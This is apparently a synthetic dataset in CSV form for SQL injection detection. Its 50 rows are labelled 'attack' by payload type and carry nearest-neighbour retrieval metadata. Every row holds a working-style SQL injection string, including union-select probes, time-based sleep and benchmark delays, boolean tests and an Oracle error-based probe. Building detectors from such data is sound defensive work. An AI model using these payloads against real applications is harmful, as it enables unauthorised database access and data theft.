id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,1'  )   and 5999  =  5879,nearest_attack_euclidean,R007936,0.15444983769074802
SMOTE_000002,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R007369,0.44670121587812994
SMOTE_000003,attack,other,1  )   where 5774  =  5774,nearest_attack_euclidean,R000908,0.0
SMOTE_000004,attack,boolean,"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""njdx"" like ""njdx",nearest_attack_euclidean,R006773,0.11268598630471648
SMOTE_000005,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003723,0.057566866075667265
SMOTE_000006,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R001488,0.17076949023562463
SMOTE_000007,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R002848,0.2709376154014071
SMOTE_000008,attack,boolean,-7726 or 3038  =  3038,nearest_attack_euclidean,R007236,0.11708532141524103
SMOTE_000009,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R001663,1.792497705959911
SMOTE_000010,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R003997,0.7952585622287404
SMOTE_000011,attack,other,-9975 where 9760  =  9760 order by 1--,nearest_attack_euclidean,R007221,0.2658141700846528
SMOTE_000012,attack,boolean,-6412%' or 4065  =  5815 and '%'  =  ',nearest_attack_euclidean,R006674,0.016735611481285318
SMOTE_000013,attack,boolean,-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,nearest_attack_euclidean,R000913,0.10195094252645868
SMOTE_000014,attack,boolean,"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",nearest_attack_euclidean,R002576,0.0325280699434497
SMOTE_000015,attack,boolean,"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003809,0.1298651226966494
SMOTE_000016,attack,boolean,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001002,0.02987328560168017
SMOTE_000017,attack,other,"iif  (  1157  =  4542,1,1/0  )  ",nearest_attack_euclidean,R001306,1.6858739404357614e-07
SMOTE_000018,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R005963,0.33192882235638743
SMOTE_000019,attack,boolean,"1' in boolean mode  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",nearest_attack_euclidean,R006707,0.958081355224445
SMOTE_000020,attack,boolean,"1' where 3425  =  3425 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R006642,0.26775872851901616
SMOTE_000021,attack,time,1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R007781,0.3047973354142323
SMOTE_000022,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu",nearest_attack_euclidean,R003892,0.2615510979379092
SMOTE_000023,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000770,0.05126777552623752
SMOTE_000024,attack,boolean,-5116  )   or   (  8287  =  4930  )  *4930,nearest_attack_euclidean,R008908,0.4696644845794237
SMOTE_000025,attack,other,"1',  (  case when 3598  =  2118 then 1 else null end  )  ",nearest_attack_euclidean,R007654,0.020017332840137122
SMOTE_000026,attack,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000262,0.0
SMOTE_000027,attack,boolean,"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006933,0.7343271052036721
SMOTE_000028,attack,other,1'+  (  select iutk where 6158  =  6158,nearest_attack_euclidean,R001350,0.0
SMOTE_000029,attack,boolean,"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",nearest_attack_euclidean,R003356,0.42867238964179727
SMOTE_000030,attack,boolean,"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",nearest_attack_euclidean,R008144,0.07285854079763115
SMOTE_000031,attack,boolean,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'jhle' like 'jhle",nearest_attack_euclidean,R002061,0.18902864251487483
SMOTE_000032,attack,union,"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",nearest_attack_euclidean,R005793,0.3515657808755964
SMOTE_000033,attack,boolean,"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'swfj' like 'swfj",nearest_attack_euclidean,R004562,0.03631386849597367
SMOTE_000034,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R002505,0.2691996126482205
SMOTE_000035,attack,other,1' where 6116  =  6116,nearest_attack_euclidean,R001565,0.06328560358099386
SMOTE_000036,attack,other,1 where 3354  =  3354,nearest_attack_euclidean,R001055,1.6858739404357614e-07
SMOTE_000037,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R004256,0.30646863588028067
SMOTE_000038,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R008434,0.08274472480718864
SMOTE_000039,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R006388,0.1815565312941461
SMOTE_000040,attack,other,-3084%'   )    )    order by 1--,nearest_attack_euclidean,R001986,0.4389457878559371
SMOTE_000041,attack,other,1'||  (  select 'mwpd' where 2887  =  2887,nearest_attack_euclidean,R005660,0.025247841779824122
SMOTE_000042,attack,other,"-6595"" order by 1--",nearest_attack_euclidean,R004493,0.36986926100888057
SMOTE_000043,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R002522,0.5951160618325714
SMOTE_000044,attack,union,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",nearest_attack_euclidean,R003264,0.14366419956322538
SMOTE_000045,attack,union,"-3116   )    )    as jyiq where 3875  =  3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",nearest_attack_euclidean,R007921,0.5043804140164158
SMOTE_000046,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R006212,0.14141813666378464
SMOTE_000047,attack,time,"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R005928,0.8451348447561357
SMOTE_000048,attack,time,"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R005464,0.6380815233222521
SMOTE_000049,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R004978,0.15292402384025292
SMOTE_000050,attack,other,1'||  (  select 'yezk' where 2097  =  2097,nearest_attack_euclidean,R006958,0.008143634285864143
